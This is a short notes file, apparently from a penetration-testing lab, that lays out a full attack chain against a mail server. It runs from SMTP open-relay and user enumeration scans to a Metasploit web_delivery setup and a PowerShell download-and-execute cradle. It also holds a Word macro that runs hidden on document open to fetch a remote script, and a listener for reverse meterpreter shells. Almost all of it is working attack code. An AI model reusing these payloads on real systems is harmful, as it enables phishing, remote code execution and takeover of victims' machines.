@@ -1,0 +1,52 @@
+# ----- nmap -p25 --script smtp-open-relay 192.168.161.201
+PORT   STATE SERVICE
+25/tcp open  smtp
+|_smtp-open-relay: Server is an open relay (8/16 tests)
+
+# ----- nmap -p25 --script smtp-commands 192.168.161.201
+PORT   STATE SERVICE
+25/tcp open  smtp
+| smtp-commands: WEB03, SIZE 20480000, AUTH LOGIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+
+# ----- pip3 install smtp-user-enum
+smtp-user-enum -M RCPT -D gotham.com -U user-mail.txt -t 192.168.161.201 
+
+######## Scan started at Fri May 16 09:30:29 2025 #########
+192.168.161.201: jobs@gotham.com exists
+######## Scan completed at Fri May 16 09:30:29 2025 #########
+1 results.
+
+# ----- web.rc 
+use exploit/multi/script/web_delivery
+set payload windows/meterpreter/reverse_http
+set target 2
+set SRVPORT 88
+set LHOST 192.168.45.220
+set LPORT 99
+
+# ----- phase1.ps1
+IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.220:88/ToZc9utV7JpBU')
+
+# ----- macros
+Sub MyMacro()
+    Dim strArg As String
+    strArg = "powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.189/share/phase1.ps1')"
+    Shell strArg, vbHide
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+# ----- rev.rc 
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set SRVPORT 77
+set LHOST 192.168.45.220
+set LPORT 443
+set ExitOnSession false
